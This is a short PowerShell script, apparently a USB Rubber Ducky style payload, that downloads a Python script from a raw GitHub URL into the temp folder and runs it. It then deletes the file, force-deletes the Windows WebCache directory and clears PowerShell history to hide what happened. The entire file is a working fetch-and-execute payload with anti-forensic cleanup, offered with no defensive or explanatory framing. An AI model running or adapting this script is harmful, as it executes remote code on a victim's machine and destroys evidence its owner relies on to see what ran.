# Download Python script
$scriptUrl = "https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/aff8e6ccdff52953812e5c770ddc004b0442c825/payloads/library/execution/CloseAllApplicationsInWindows/script.py"
$savePath = "$env:temp\script.py"
(New-Object System.Net.WebClient).DownloadFile($scriptUrl, $savePath)

# Execute Python script
& python $savePath

# Delete the downloaded script
Remove-Item $savePath

# Clear the download history from the system's web cache
Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*" -Recurse -Force

# Clear the PowerShell command history
Clear-History
